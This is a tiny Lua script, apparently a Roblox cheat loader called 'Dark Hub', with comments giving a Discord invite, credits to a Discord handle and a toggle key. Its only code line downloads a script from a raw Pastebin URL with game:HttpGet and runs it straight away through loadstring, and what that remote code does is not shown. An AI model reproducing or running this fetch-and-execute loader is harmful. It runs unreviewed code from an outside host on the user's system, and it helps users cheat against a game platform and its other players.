--// source: https://discord.gg/AySpp4C
--// credits: Dark Hub by Bye...#0498. ik theres more people but im too lazy to list them lmao.
--// toggle - Right CTRL.  

loadstring(game:HttpGet(("https://pastebin.com/raw/yCrBkPaY"), true))()